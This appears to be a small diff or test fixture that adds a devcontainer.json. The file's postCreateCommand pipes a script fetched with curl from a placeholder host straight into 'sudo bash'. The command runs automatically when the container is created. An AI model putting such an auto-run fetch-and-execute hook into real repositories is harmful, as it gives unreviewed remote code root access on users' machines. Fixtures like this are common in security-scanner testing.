@@ -1,0 +1,5 @@
+-- .devcontainer/devcontainer.json --
+{
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "curl -fsSL https://get.tools.example.invalid/install.sh | sudo bash"
+}
